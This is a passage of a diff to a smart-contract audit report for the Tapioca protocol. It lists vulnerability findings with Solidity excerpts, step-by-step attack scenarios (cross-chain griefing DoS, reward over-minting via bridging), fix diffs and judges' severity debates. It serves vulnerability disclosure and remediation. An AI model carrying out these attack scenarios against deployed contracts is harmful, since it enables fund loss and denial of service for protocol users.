+- `dstGasForCall` which is the gas amount forwarded while calling the `sgReceive` on the destination contract.
+- `dstNativeAmount` and `dstNativeAddr` which is the amount and address where the native token is sent to.
+
+Inside the `Balancer.sol` contract, the [`dstGasForCall` is hardcoded to 0](https://github.com/sherlock-audit/2024-02-tapioca/blob/dc2464f420927409a67763de6ec60fe5c028ab0e/TapiocaZ/contracts/Balancer.sol#L316). 
+The `dstGasForCall` gets forwarded from Stargate `Router` into the Stargate [`Bridge`](https://github.com/stargate-protocol/stargate/blob/c647a3a647fc693c38b16ef023c54e518b46e206/contracts/Bridge.sol#L115) contract.
+
+```solidity
+    function swap(
+        uint16 _chainId,
+        uint256 _srcPoolId,
+        uint256 _dstPoolId,
+        address payable _refundAddress,
+        Pool.CreditObj memory _c,
+        Pool.SwapObj memory _s,
+>>>>>>        IStargateRouter.lzTxObj memory _lzTxParams, 
+        bytes calldata _to,
+        bytes calldata _payload
+    ) external payable onlyRouter {
+>>>>>>        bytes memory payload = abi.encode(TYPE_SWAP_REMOTE, _srcPoolId, _dstPoolId, _lzTxParams.dstGasForCall, _c, _s, _to, _payload);
+        _call(_chainId, TYPE_SWAP_REMOTE, _refundAddress, _lzTxParams, payload);
+    }
+
+    function _call(
+        uint16 _chainId,
+        uint8 _type,
+        address payable _refundAddress,
+        IStargateRouter.lzTxObj memory _lzTxParams,
+        bytes memory _payload
+    ) internal {
+        bytes memory lzTxParamBuilt = _txParamBuilder(_chainId, _type, _lzTxParams);
+        uint64 nextNonce = layerZeroEndpoint.getOutboundNonce(_chainId, address(this)) + 1;
+        layerZeroEndpoint.send{value: msg.value}(_chainId, bridgeLookup[_chainId], _payload, _refundAddress, address(this), lzTxParamBuilt);
+        emit SendMsg(_type, nextNonce);
+    }
+```
+
+It gets encoded inside the payload that is sent through the LayerZero message. 
+The payload gets decoded inside the [`Bridge::lzReceive`](https://github.com/stargate-protocol/stargate/blob/c647a3a647fc693c38b16ef023c54e518b46e206/contracts/Bridge.sol#L79) on destination chain. 
+And `dstGasForCall` is forwarded to the [`sgReceive`](https://github.com/stargate-protocol/stargate/blob/c647a3a647fc693c38b16ef023c54e518b46e206/contracts/Router.sol#L406) function:
+
+```solidity
+## Bridge.sol
+
+ function lzReceive(
+        uint16 _srcChainId,
+        bytes memory _srcAddress,
+        uint64 _nonce,
+        bytes memory _payload
+    ) external override {
+        if (functionType == TYPE_SWAP_REMOTE) {
+            (
+                ,
+                uint256 srcPoolId,
+                uint256 dstPoolId,
+>>>>>                uint256 dstGasForCall,
+                Pool.CreditObj memory c,
+                Pool.SwapObj memory s,
+                bytes memory to,
+                bytes memory payload
+            ) = abi.decode(_payload, (uint8, uint256, uint256, uint256, Pool.CreditObj, Pool.SwapObj, bytes, bytes));
+```
+
+If it is zero like in the `Balancer.sol` contract or its value is too small the `sgReceive` will fail, but the payload will be saved in the `cachedSwapLookup` mapping. At the same time the tokens are transferred to the destination contract, which is the `mTOFT`.
+Now anyone can call the `sgReceive` manually through the [`clearCachedSwap`](https://github.com/stargate-protocol/stargate/blob/c647a3a647fc693c38b16ef023c54e518b46e206/contracts/Router.sol#L285) function:
+
+```solidity
+    function clearCachedSwap(
+        uint16 _srcChainId,
+        bytes calldata _srcAddress,
+        uint256 _nonce
+    ) external {
+        CachedSwap memory cs = cachedSwapLookup[_srcChainId][_srcAddress][_nonce];
+        require(cs.to != address(0x0), "Stargate: cache already cleared");
+        // clear the data
+        cachedSwapLookup[_srcChainId][_srcAddress][_nonce] = CachedSwap(address(0x0), 0, address(0x0), "");
+        IStargateReceiver(cs.to).sgReceive(_srcChainId, _srcAddress, _nonce, cs.token, cs.amountLD, cs.payload);
+    }
+```
+
+Although not the intended behavior there seems to be no issue with erc20 token sitting on the `mTOFT` contract for a shorter period of time.
+
+### sgReceive
+
+This leads to the second issue. The `sgReceive` function interface specifies the `chainId`, `srcAddress`, and `token`.
+- `chainId` is the layerZero chainId of the source chain. In their docs referred to endpointId: https://layerzero.gitbook.io/docs/technical-reference/mainnet/supported-chain-ids
+- `srcAddress` is the address of the source sending contract
+- `token` is the address of the token that was sent to the destination contract. 
+
+In the current implementation, the `sgReceive` function doesn't check any of these parameters. In practice this means that anyone can specify the `mTOFT` address as the receiver and initiate Stargate Swap from any chain to the `mTOFT` contract.
+
+In conjunction with the first issue, this opens up the possibility of a DoS attack.
+
+Let's imagine the following scenario: 
+
+- Rebalancing operation needs to be performed between `mTOFT` on Ethereum and Avalanche that hold `USDC` as the underlying token.
+- Rebalancing is initiated from Ethereum but the `sgReceive` on Avalanche fails and 1000 USDCs are sitting on `mTOFT` contract on Avalanche.
+- A griever noticed this and initiated Stargate swap from Ethereum to Avalanche for 1 USDT specifying the `mTOFT` contract as the receiver.
+- This is successful and now `mTOFT` has 1 `USDT` but 999 `USDC` as the griever's transaction has called the `sgRecieve` function that pushed 1 USDC to the `TOFTVault`. 
+- As a consequence, the `clearCachedSwap` function fails because it tries to transfer the original 1000 USDC. 
+
+```solidity
+    function sgReceive(uint16, bytes memory, uint256, address, uint256 amountLD, bytes memory) external payable {
+        if (msg.sender != _stargateRouter) revert mTOFT_NotAuthorized();
+
+        if (erc20 == address(0)) {
+            vault.depositNative{value: amountLD}();
+        } else {
+>>>>>            IERC20(erc20).safeTransfer(address(vault), amountLD); // amountLD is the original 1000 USDC
+        }
+    }
+```
+- The only solution here is to manually transfer that 1 USDC to the `mTOFT` contract and try calling the `clearCachedSwap` again.
+- The griever can repeat this process multiple times.
+
+
+## Impact
+Hardcoding the `dstGasCall` to 0 in conjuction with not checking the `sgReceive` parameters opens up the possibility of a long-term DoS attack.  
+
+## Code Snippet
+- https://github.com/sherlock-audit/2024-02-tapioca/blob/dc2464f420927409a67763de6ec60fe5c028ab0e/TapiocaZ/contracts/tOFT/mTOFT.sol#L326
+- https://github.com/sherlock-audit/2024-02-tapioca/blob/dc2464f420927409a67763de6ec60fe5c028ab0e/TapiocaZ/contracts/Balancer.sol#L316
+
+## Tool used
+
+Manual Review
+
+## Recommendation
+
+The `dstGasForCall` shouldn't be hardcoded to 0. It should be a configurable value that is set by the admin of the `Balancer` contract. 
+
+Take into account that this value will be different for different chains.
+
+For instance, Arbitrum has a different gas model than Ethereum due to its specific precompiles: https://docs.arbitrum.io/arbos/gas.
+<img width="865" alt="Screenshot 2024-03-13 at 14 52 09" src="https://github.com/sherlock-audit/2024-02-tapioca-windhustler/assets/38017754/874dbe44-6641-47a2-b41b-6c55e2a93a3c">
+
+The recommended solution is:
+
+```diff
+ contract Balancer is Ownable {
+     using SafeERC20 for IERC20;
+
++    mapping(uint16 => uint256) internal sgReceiveGas;
+
++    function setSgReceiveGas(uint16 eid, uint256 gas) external onlyOwner {
++        sgReceiveGas[eid] = gas;
++    }
++
++    function getSgReceiveGas(uint16 eid) internal view returns (uint256) {
++        uint256 gas = sgReceiveGas[eid];
++        if (gas == 0) revert();
++        return gas;
++    }
++
+-    IStargateRouterBase.lzTxObj({dstGasForCall: 0, dstNativeAmount: 0, dstNativeAddr: "0x0"}),
++    IStargateRouterBase.lzTxObj({dstGasForCall: getSgReceiveGas(_dstChainId), dstNativeAmount: 0, dstNativeAddr: "0x0"}),
+```
+
+
+
+## Discussion
+
+**cryptotechmaker**
+
+Low/Informational/ It's not a required feature. This allows you to airdrop some native tokens to a destination
+
+**sherlock-admin4**
+
+The protocol team fixed this issue in PR/commit https://github.com/Tapioca-DAO/TapiocaZ/pull/177.
+
+**HollaDieWaldfee100**
+
+Escalate
+
+The sponsor's comment is misleading. He is referencing the `dstNativeAmount` and `dstNativeAddr` which can be left as 0, as this functionality is not needed. 
+The whole report talks about the `dstGasForCall` that is hardcoded to 0. This will lead to `sgReceive` not being called and open up the possibility of a DoS attack vector on the receiving side.  
+The report also highlights the gas differences between chains and the importance of properly setting `dstGasForCall` per destination chain. Recommendations were implemented in the Tapioca-DAO/TapiocaZ#177.
+Based on all the arguments this should be a valid medium severity issue.
+
+**sherlock-admin2**
+
+> Escalate
+> 
+> The sponsor's comment is misleading. He is referencing the `dstNativeAmount` and `dstNativeAddr` which can be left as 0, as this functionality is not needed. 
+> The whole report talks about the `dstGasForCall` that is hardcoded to 0. This will lead to `sgReceive` not being called and open up the possibility of a DoS attack vector on the receiving side.  
+> The report also highlights the gas differences between chains and the importance of properly setting `dstGasForCall` per destination chain. Recommendations were implemented in the Tapioca-DAO/TapiocaZ#177.
+> Based on all the arguments this should be a valid medium severity issue.
+
+You've created a valid escalation!
+
+To remove the escalation from consideration: Delete your comment.
+
+You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.
+
+**Tendency001**
+
+Hardcoding zero gas actually triggers a revert on the same chain down the logic in `RelayerV2::_getPrices`
+```solidity
+        // decoding the _adapterParameters - reverts if type 2 and there is no dstNativeAddress
+        require(_adapterParameters.length == 34 || _adapterParameters.length > 66, "Relayer: wrong _adapterParameters size");
+        uint16 txType;
+        uint extraGas;
+        assembly {
+            txType := mload(add(_adapterParameters, 2))
+            extraGas := mload(add(_adapterParameters, 34))
+        }
+        require(extraGas > 0, "Relayer: gas too low");
+```
+The call never gets delivered to the destination chain to introduce the said DOS
+
+**windhustler**
+
+This call does get delivered to the destination chain. The `dstGasForCall` is the gas passed to the `sgReceive`, and the [base gas is a configuration inside Stargate](https://github.com/stargate-protocol/stargate/blob/main/contracts/Bridge.sol#L285-#L289):
+
+```solidity
+    function _txParamBuilder(
+        uint16 _chainId,
+        uint8 _type,
+        IStargateRouter.lzTxObj memory _lzTxParams
+    ) internal view returns (bytes memory) {
+        bytes memory lzTxParam;
+        address dstNativeAddr;
+        {
+            bytes memory dstNativeAddrBytes = _lzTxParams.dstNativeAddr;
+            assembly {
+                dstNativeAddr := mload(add(dstNativeAddrBytes, 20))
+            }
+        }
+
+>>>        uint256 totalGas = gasLookup[_chainId][_type].add(_lzTxParams.dstGasForCall);
+        if (_lzTxParams.dstNativeAmount > 0 && dstNativeAddr != address(0x0)) {
+>>>            lzTxParam = txParamBuilderType2(totalGas, _lzTxParams.dstNativeAmount, _lzTxParams.dstNativeAddr);
+        } else {
+>>>            lzTxParam = txParamBuilderType1(totalGas);
+        }
+
+        return lzTxParam;
+    }
+```
+
+You can see that `dstGasForCall` is simply added to the totalGas. In other words, Stargate will always deliver the message but if you hardcode `dstGasForCall` to 0 `sgReceive` will revert.
+
+Setting `dstGasForCall` to 0 would be a strange configuration parameter if it would disallow sending messages. 
+
+**Tendency001**
+
+You are right.
+Great find 🫡
+
+**maarcweiss**
+
+@windhustler should we also use the set gas receiver stuff on the following PR, correct?: https://github.com/Tapioca-DAO/TapiocaZ/pull/174/files
+
+**windhustler**
+
+Hey, yes you need to use the appropriate `dstGasForCall` here as well. You can reuse the `_sgReceiveGas` value from here: https://github.com/Tapioca-DAO/TapiocaZ/pull/177/files. 
+
+**cvetanovv**
+
+While it is a valid report, the main root is hardcoded `dstGasCall` to 0. And the same root vulnerability was found in the "Pashov Audit Group" audit - [H-07](https://3014726245-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FfBay3bZwWmLdUX02P7Qc%2Fuploads%2FacpTKQyK9l2Yc61DQbch%2FTapiocaDAO-security-review-report.pdf?alt=media&token=6eedce9c-8ac8-4fa2-9605-05e4a96bddaa). 
+According to Sherlock's rules, this makes the report invalid. 
+
+@nevillehuang what do you think?
+
+**windhustler**
+
+@cvetanovv I've just checked [H-07](https://3014726245-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FfBay3bZwWmLdUX02P7Qc%2Fuploads%2FacpTKQyK9l2Yc61DQbch%2FTapiocaDAO-security-review-report.pdf?alt=media&token=6eedce9c-8ac8-4fa2-9605-05e4a96bddaa). It has several false/inaccurate claims which is probably the reason why Tapioca team hasn't fixed this:
+
+- It claims if `dstGasForCall == 0`, a fee will be charged based on the default 200k gas, i.e. `sgRecieve` on the destination will be called with 200k gas. This is not correct, see https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/72#issuecomment-2034713451. The 200k gas is the default value if you are sending layer zero messages with gas set to 0. Using Stargate is different. `dstGasForCall` is exclusively used as gas passed for `sgReceive`. 
+
+- Based on the false assumptions it derives the impact of underpaying/overpaying Stargate fees which is quite different than the impact this report claims. 
+
+- It doesn't make the distinction between setting different gas configurations for different chains. 
+
+**cvetanovv**
+
+After doing some research I agree with @windhustler comment. So, I plan to accept the escalation and make the issue a valid Medium.
+
+**nevillehuang**
+
+I think I agree with medium severity, unless @cryptotechmaker would like to clarify the above comment [here](https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/72#issuecomment-2018276507)
+
+**Evert0x**
+
+Result:
+Medium
+Unique
+
+**sherlock-admin3**
+
+Escalations have been resolved successfully!
+
+Escalation status:
+- [HollaDieWaldfee100](https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/72/#issuecomment-2034505558): accepted
+
+# Issue M-17: Leverage borrowing with stale rate can atomically create bad debt with no prior positions and no investment 
 
 Source: https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/79 
 
 ## Found by 
-AuditorPraise, Tendency, hyh
+hyh
 ## Summary
 
 Leverage buying, borrow and collateral removal can increase riskness of a position, but are allowed to be performed with a stale exchange rate within `rateValidDuration` both in BB ansd SGL. This can provide a way for creating bad debt whenever actual rate dropped more than `FEE_PRECISION - collateralizationRate` (`25%`).
@@ -3803,7 +5238,7 @@ All the other `solvent(from, false)` instances can stay intact.
 
 The protocol team fixed this issue in PR/commit https://github.com/Tapioca-DAO/Tapioca-bar/pull/357.
 
-# Issue M-17: `getCollateral` and `getAsset` functions of the AssetTotsDaiLeverageExecutor contract decode data incorrectly 
+# Issue M-18: `getCollateral` and `getAsset` functions of the AssetTotsDaiLeverageExecutor contract decode data incorrectly 
 
 Source: https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/84 
 
@@ -3869,7 +5304,7 @@ Yes, it causes a revert.
 
 The protocol team fixed this issue in PR/commit https://github.com/Tapioca-DAO/Tapioca-bar/commit/2432f1e85cb241d46b8da220226a744b7fc36f88.
 
-# Issue M-18: Balancer rebalance operation is permanently blocked whenever owner assigns `rebalancer` role to some other address 
+# Issue M-19: Balancer rebalance operation is permanently blocked whenever owner assigns `rebalancer` role to some other address 
 
 Source: https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/89 
 
@@ -3990,7 +5425,7 @@ The protocol team fixed this issue in PR/commit https://github.com/Tapioca-DAO/T
 
 @cryptotechmaker Why was this the initial intention? I am inclined to keep medium severity given a direct code change was made to unblock DoS.
 
-# Issue M-19: Unpausing with accrue timestamp reset can remove the accrual between last recorded accrue time and pausing time 
+# Issue M-20: Unpausing with accrue timestamp reset can remove the accrual between last recorded accrue time and pausing time 
 
 Source: https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/91 
 
@@ -4069,7 +5504,7 @@ https://github.com/sherlock-audit/2024-02-tapioca/blob/main/Tapioca-bar/contract
 
 The protocol team fixed this issue in PR/commit https://github.com/Tapioca-DAO/Tapioca-bar/pull/358.
 
-# Issue M-20: Balancer using safeApprove may lead to revert. 
+# Issue M-21: Balancer using safeApprove may lead to revert. 
 
 Source: https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/94 
 
@@ -4207,7 +5642,7 @@ Yeah, this might happen. We should add it. What are your thoughts on using force
 
 The protocol team fixed this issue in PR/commit https://github.com/Tapioca-DAO/TapiocaZ/pull/181.
 
-# Issue M-21: buyCollateral()  does not work properly 
+# Issue M-22: buyCollateral()  does not work properly 
 
 Source: https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/100 
 
@@ -4362,99 +5797,12 @@ Manual Review
 
 The protocol team fixed this issue in PR/commit https://github.com/Tapioca-DAO/Tapioca-bar/pull/359.
 
-# Issue M-22: sellCollateral() using incorrect parameters when calling getAsset 
-
-Source: https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/103 
-
-## Found by 
-bin2chen
-## Summary
-sellCollateral() using incorrect parameters when calling getAsset
-
-## Vulnerability Detail
-`BBLeverage.sellCollateral()` the code is follows:
-
-```solidity
-    function sellCollateral(address from, uint256 share, bytes calldata data)
-        external
-        optionNotPaused(PauseType.LeverageSell)
-        solvent(from, false)
-        notSelf(from)
-        returns (uint256 amountOut)
-    {
-...
-        amountOut = leverageExecutor.getAsset(
-@>          assetId, address(collateral), address(asset), memoryData.leverageAmount, from, data
-        );
-        memoryData.shareOut = yieldBox.toShare(assetId, amountOut, false);
-        address(asset).safeApprove(address(yieldBox), type(uint256).max);
-```
-
-In the function call `getAsset(assetId, address(collateral)...)`, the second parameter is passed as `collateral`, but it should actually be `asset`.
-
-```solidity
-interface ILeverageExecutor {
-..
-    function getAsset(
-        uint256 assetId,
-@>      address assetAddress,
-        address collateralAddress,
-        uint256 collateralAmountIn,
-        address from,
-        bytes calldata data
-    ) external returns (uint256 assetAmountOut); //used for sellCollateral
-```
-
-## Impact
-Incorrect usage of `getAsset()` can lead to exchange failures.
-
-## Code Snippet
-https://github.com/sherlock-audit/2024-02-tapioca/blob/main/Tapioca-bar/contracts/markets/bigBang/BBLeverage.sol#L144
-
-## Tool used
-
-Manual Review
-
-## Recommendation
-```diff
-    function sellCollateral(address from, uint256 share, bytes calldata data)
-        external
-        optionNotPaused(PauseType.LeverageSell)
-        solvent(from, false)
-        notSelf(from)
-        returns (uint256 amountOut)
-    {
-        if (address(leverageExecutor) == address(0)) {
-            revert LeverageExecutorNotValid();
-        }
-        _allowedBorrow(from, share);
-        _removeCollateral(from, address(this), share);
-
-        _SellCollateralMemoryData memory memoryData;
-
-        (, memoryData.obtainedShare) =
-            yieldBox.withdraw(collateralId, address(this), address(leverageExecutor), 0, share);
-        memoryData.leverageAmount = yieldBox.toAmount(collateralId, memoryData.obtainedShare, false);
-        amountOut = leverageExecutor.getAsset(
--           assetId, address(collateral), address(asset), memoryData.leverageAmount, from, data
-+           assetId, address(asset), address(collateral), memoryData.leverageAmount, from, data
-        );
-```
-
-
-
-## Discussion
-
-**sherlock-admin4**
-
-The protocol team fixed this issue in PR/commit https://github.com/Tapioca-DAO/Tapioca-bar/pull/361.
-
 # Issue M-23: DoS in BBLeverage and SGLLeverage due to using wrong leverage executor interface 
 
 Source: https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/115 
 
 ## Found by 
-0xadrii, GiuseppeDeLaZara, cergyk, duc
+0xadrii, GiuseppeDeLaZara, bin2chen, cergyk, duc
 ## Summary
 
 A DoS takes place due to utilizing a wrong interface in the leverage modules.
@@ -4582,7 +5930,152 @@ Update the interface used in BBLeverage.sol and SGLLeverage.sol and pass the pro
 
 The protocol team fixed this issue in PR/commit https://github.com/Tapioca-DAO/Tapioca-bar/pull/362; https://github.com/Tapioca-DAO/tapioca-periph/pull/201.
 
-# Issue M-24: Not properly tracking debt accrual leads mintOpenInterestDebt() to lose twTap rewards 
+# Issue M-24: Variable opening fee will always be wrongly computed if collateral is not a stablecoin 
+
+Source: https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/119 
+
+## Found by 
+0xadrii, Tendency
+## Summary
+
+Borrowing fees will be computed wrongly because of a combination of hardcoded values and a wrongly implemented setter function.
+
+## Vulnerability Detail
+
+Tapioca applies a linearly scaling creation fee to open a new CDP in Big Bang markets. This is done via the internal `_computeVariableOpeningFee()` function every time a new borrow is performed.
+
+In order to compute the variable fee, the exchange rate will be queried. This rate is important in order to understand the current price of USDO related to the collateral asset. 
+
+- If `_exchangeRate >= minMintFeeStart`, then `minMintFee` will be applied.
+- If `_exchangeRate <= maxMintFeeStart`, then `maxMintFee` will be applied
+- Otherwise, a proportional percentage will be applied to compue the fee
+
+As per the comment in the code snippet shows below, Tapioca wrongly assumes that the exchange rate will always be `USDO <> USDC`, when in reality the actual collateral will dictate the exchange rate returned. 
+
+It is also important to note the fact that contrary to what one would assume, `maxMintFeeStart` is assumed to be smaller than `minMintFeeStart` in order to perform the calculations:
+
+```solidity
+// BBLendingCommon.sol
+
+function _computeVariableOpeningFee(uint256 amount) internal returns (uint256) {
+        if (amount == 0) return 0; 
+ 
+        //get asset <> USDC price ( USDO <> USDC ) 
+        (bool updated, uint256 _exchangeRate) = assetOracle.get(oracleData); 
+        if (!updated) revert OracleCallFailed();
+   
+        if (_exchangeRate >= minMintFeeStart) { 
+            return (amount * minMintFee) / FEE_PRECISION;
+        }
+        if (_exchangeRate <= maxMintFeeStart) { 
+            return (amount * maxMintFee) / FEE_PRECISION;
+        }
+     
+        uint256 fee = maxMintFee
+            - (((_exchangeRate - maxMintFeeStart) * (maxMintFee - minMintFee)) / (minMintFeeStart - maxMintFeeStart)); 
+ 
+        if (fee > maxMintFee) return (amount * maxMintFee) / FEE_PRECISION;
+        if (fee < minMintFee) return (amount * minMintFee) / FEE_PRECISION;
+
+        if (fee > 0) {
+            return (amount * fee) / FEE_PRECISION;
+        }
+        return 0;
+    }
+```
+
+It is also important to note that `minMintFeeStart` and `maxMintFeeStart` are hardcoded when being initialized inside `BigBang.sol` (as mentioned, `maxMintFeeStart` is smaller than `minMintFeeStart`):
+
+```solidity
+// BigBang.sol
+
+function _initCoreStorage(
+        IPenrose _penrose,
+        IERC20 _collateral,
+        uint256 _collateralId,
+        ITapiocaOracle _oracle,
+        uint256 _exchangeRatePrecision,
+        uint256 _collateralizationRate,
+        uint256 _liquidationCollateralizationRate,
+        ILeverageExecutor _leverageExecutor
+    ) private {
+        ...
+        
+        maxMintFeeStart = 975000000000000000; // 0.975 *1e18
+        minMintFeeStart = 1000000000000000000; // 1*1e18
+
+        ...
+    } 
+```
+
+While the values hardcoded initially to values that are coherent for a USDO <> stablecoin exchange rate, these values won’t make sense if we find ourselves fetching an exchcange rate of an asset not stable.
+
+Let’s say the collateral asset is ETH. If ETH is at 4000$, then the exchange rate will return a value of 0,00025. This will make the computation inside `_computeVariableOpeningFee()` always apply the maximum fee when borrowing because `_exchangeRate` is always smaller than `maxMintFeeStart` by default.
+
+Although this has an easy fix (changing the values stored in `maxMintFeeStart` and  `minMintFeeStart`), this can’t be properly done because the `setMinAndMaxMintRange()` function wrongly assumes that `minMintFeeStart` must be smaller than `maxMintFeeStart` (against what the actual calculations dictate in the `_computeVariableOpeningFee()`): 
+
+```solidity
+// BigBang.sol
+
+function setMinAndMaxMintRange(uint256 _min, uint256 _max) external onlyOwner {
+        emit UpdateMinMaxMintRange(minMintFeeStart, _min, maxMintFeeStart, _max);
+
+        if (_min >= _max) revert NotValid(); 
+
+        minMintFeeStart = _min;
+        maxMintFeeStart = _max;
+    } 
+```
+
+This will make it impossible to properly update the `maxMintFeeStart` and `minMintFeeStart` to have proper values because if it is enforced that `maxMintFeeStart` > than `minMintFeeStart`, then `_computeVariableOpeningFee()` will always enter the first `if (_exchangeRate >= minMintFeeStart)` and wrongly return the minimum fee.
+
+## Impact
+
+Medium. Although this looks like a bug that doesn’t have a big impact in the protocol, it actually does. The fees will always be wrongly applied for collaterals different from stablecoins, and applying these kind of fees when borrowing is one of the core mechanisms to keep USDO peg, as described in [Tapioca’s documentation](https://docs.tapioca.xyz/tapioca/core-technologies/big-bang#variable-usdo-creation-fee). If this mechanisms doesn’t work properly, users won’t be properly incentivized to borrow/repay considering the different market conditions that might take place and affect USDO’s peg to $1.
+
+## Code Snippet
+
+https://github.com/sherlock-audit/2024-02-tapioca/blob/main/Tapioca-bar/contracts/markets/bigBang/BBLendingCommon.sol#L87-L91
+
+https://github.com/sherlock-audit/2024-02-tapioca/blob/main/Tapioca-bar/contracts/markets/bigBang/BigBang.sol#L194-L195
+
+## Tool used
+
+Manual Review
+
+## Recommendation
+
+The mitigation for this is straightforward. Change the `setMinAndMaxMintRange()` function so that `_max` is enforced to be smaller than `_min`:
+
+```diff
+// BigBang.sol
+
+function setMinAndMaxMintRange(uint256 _min, uint256 _max) external onlyOwner {
+        emit UpdateMinMaxMintRange(minMintFeeStart, _min, maxMintFeeStart, _max);
+
+-        if (_min >= _max) revert NotValid(); 
++        if (_max >= _min) revert NotValid(); 
+
+        minMintFeeStart = _min;
+        maxMintFeeStart = _max;
+    } 
+```
+
+Also, I would recommend not to hardcode the values of `maxMintFeeStart` and `minMintFeeStart` and pass them as parameter instead, inside `_initCoreStorage()` , as they should always be different considering the collateral configured for that market.
+
+
+
+## Discussion
+
+**cryptotechmaker**
+
+Low; the `assetOracle` is different from the `oracle` state var which is represented by the market's collateral. The `assetOracle` checks the USDO price against USDC
+
+**sherlock-admin4**
+
+The protocol team fixed this issue in PR/commit https://github.com/Tapioca-DAO/Tapioca-bar/pull/374.
+
+# Issue M-25: Not properly tracking debt accrual leads mintOpenInterestDebt() to lose twTap rewards 
 
 Source: https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/120 
 
@@ -4682,7 +6175,139 @@ One of the possible fixes for this issue is to track debt with a storage variabl
 
 
 
-# Issue M-25: USDO’s MSG_TAP_EXERCISE compose messages where exercised options must be withdrawn to another chain will always fail due to wrongly requiring sendParam's to address to be whitelisted in the Cluster 
+**sherlock-admin4**
+
+The protocol team fixed this issue in PR/commit https://github.com/Tapioca-DAO/Tapioca-bar/pull/380; https://github.com/Tapioca-DAO/tapioca-periph/pull/203.
+
+**0xadrii**
+
+Escalate
+
+Although this issue was initially marked as Medium, I believe it should actually be set as High severity.
+
+As shown in the report, this bug has two main issues:
+1. Rewards can be lost due to users repaying prior to reward distribution
+2. Bridging USDO is not considered, which might have two possible outcomes that affect the protocol:
+    - Bridge USDO from another chain to the chain where rewards are being distributed, thus incrementing USDO's `usdoSupply`, and effectively preventing rewards being distributed due to `usdoSupply` being greater than `totalUsdoDebt` (this can be considered as medium impact, as this is not a direct loss of funds and is rather missing a portion of expected rewards)
+    - Prior to reward distribution, bridge USDO from the chain where rewards are being distributed to another chain. **This is the actual scenario that will have a high impact to the protocol**. Below is a detailed explanation focusing on this exact scenario.
+
+As per the code implementation, the difference between `totalUsdoDebt` debt compared with the current `usdoSupply` will be minted as twTap rewards:
+
+```solidity
+// Penrose.sol
+...
+//debt should always be > USDO supply
+ function mintOpenInterestDebt(address twTap) external onlyOwner { 
+    if (totalUsdoDebt > usdoSupply) { 
+        uint256 _amount = totalUsdoDebt - usdoSupply;
+    
+        //mint against the open interest; supply should be fully minted now
+        IUsdo(address(usdoToken)).mint(address(this), _amount);
+
+        //send it to twTap
+        uint256 rewardTokenId = ITwTap(twTap).rewardTokenIndex(address(usdoToken));
+        _distributeOnTwTap(_amount, rewardTokenId, address(usdoToken), ITwTap(twTap));
+    }
+ }
+    
+
+```
+
+
+The high impact attack vector where USDO bridging is not considered allows an attacker to bridge USDO right before rewards are about to be distributed. This will make `usdoSupply` decrease, making the `_amount` obtained from substracting `usdoSupply` to `totalUsdoDebt` be actually bigger than what it should be. 
+
+In order to better understand the impact of the attack, consider the following scenario:
+- Currently the protocol has a `totalUsdoDebt` of 1500 USDO and a `usdoSupply` of 1000 USDO. This means that a reward distribution would mint 500 USDO (`totalUsdoDebt` - `usdoSupply`)  to be distributed on twTap. 
+
+1. An attacker borrows 1000 USDO, thus increasing `totalUsdoDebt` to 2500 USDO, and `usdoSupply` to 2000 USDO. If a reward distribution was to take place now, the amount of USDO to be distributed would still be 500 USDO, because the borrow made `totalUsdoDebt` and `usdoSupply` increase at the same time.
+2. The attacker then decides to bridge their 1000 USDO to another chain. This will make `usdoSupply` in the current chain decrease and become 1000 USDO again. However, `totalUsdoDebt` is still 2500 USDO because `totalUsdoDebt` is obtained from the `computeTotalDebt()` function, which as mentioned in my report fetches the debt data from each market's `totalBorrow` variable (a variable that does **NOT** get modified when a bridge takes place)
+3. The protocol team decides to execute a reward distribution by calling `mintOpenInterestDebt()`. Although the actual amount that should be minted and distributed is 500 USDO, the real amount that will be minted is 1500 USDO (2500 USDO of `totalUsdoDebt` - 1000 USDO of `usdoSupply`). This makes 1000 more USDO to be minted than the intended.
+
+As mentioned, the severity of this attack should be considered as high because:
+- An important loss of funds can be produced. An attacker can perform this attack every time a reward distribution takes place (which, [as mentioned in the docs](https://docs.tapioca.xyz/tapioca/token-economy/twtap#rewards), is expected to be performed in weekly epochs), and the attacker is not heavily constrained to perform the attack.
+- It breaks the core mechanism of the protocol of keeping USDO peg. Because this attack makes the USDO supply be way greater than what is intended, the excess of supply will affect USDO's peg, which should be considered as a high impact for a protocol that plans to release a stablecoin.
+
+**sherlock-admin2**
+
+> Escalate
+> 
+> Although this issue was initially marked as Medium, I believe it should actually be set as High severity.
+> 
+> As shown in the report, this bug has two main issues:
+> 1. Rewards can be lost due to users repaying prior to reward distribution
+> 2. Bridging USDO is not considered, which might have two possible outcomes that affect the protocol:
+>     - Bridge USDO from another chain to the chain where rewards are being distributed, thus incrementing USDO's `usdoSupply`, and effectively preventing rewards being distributed due to `usdoSupply` being greater than `totalUsdoDebt` (this can be considered as medium impact, as this is not a direct loss of funds and is rather missing a portion of expected rewards)
+>     - Prior to reward distribution, bridge USDO from the chain where rewards are being distributed to another chain. **This is the actual scenario that will have a high impact to the protocol**. Below is a detailed explanation focusing on this exact scenario.
+> 
+> As per the code implementation, the difference between `totalUsdoDebt` debt compared with the current `usdoSupply` will be minted as twTap rewards:
+> 
+> ```solidity
+> // Penrose.sol
+> ...
+> //debt should always be > USDO supply
+>  function mintOpenInterestDebt(address twTap) external onlyOwner { 
+>     if (totalUsdoDebt > usdoSupply) { 
+>         uint256 _amount = totalUsdoDebt - usdoSupply;
+>     
+>         //mint against the open interest; supply should be fully minted now
+>         IUsdo(address(usdoToken)).mint(address(this), _amount);
+> 
+>         //send it to twTap
+>         uint256 rewardTokenId = ITwTap(twTap).rewardTokenIndex(address(usdoToken));
+>         _distributeOnTwTap(_amount, rewardTokenId, address(usdoToken), ITwTap(twTap));
+>     }
+>  }
+>     
+> 
